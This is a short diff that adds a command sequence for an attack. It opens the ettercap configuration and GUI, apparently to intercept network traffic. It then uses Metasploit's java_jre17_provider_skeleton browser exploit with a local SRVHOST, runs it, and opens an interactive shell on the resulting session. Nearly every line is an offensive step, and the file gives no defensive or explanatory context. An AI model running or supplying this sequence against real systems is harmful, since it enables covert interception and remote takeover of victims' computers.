@@ -1,0 +1,12 @@
+mousepad /etc/ettercap/etter.conf
+ettercap -G
+msfconsole
+search java_jre17_provider_skeleton
+use exploit/multi/browser/java_jre17_provider_skeleton
+show options
+set SRVHOST 192.168.1.128
+set URIPATH /
+exploit
+sessions -i
+sessions -i 1
+shell
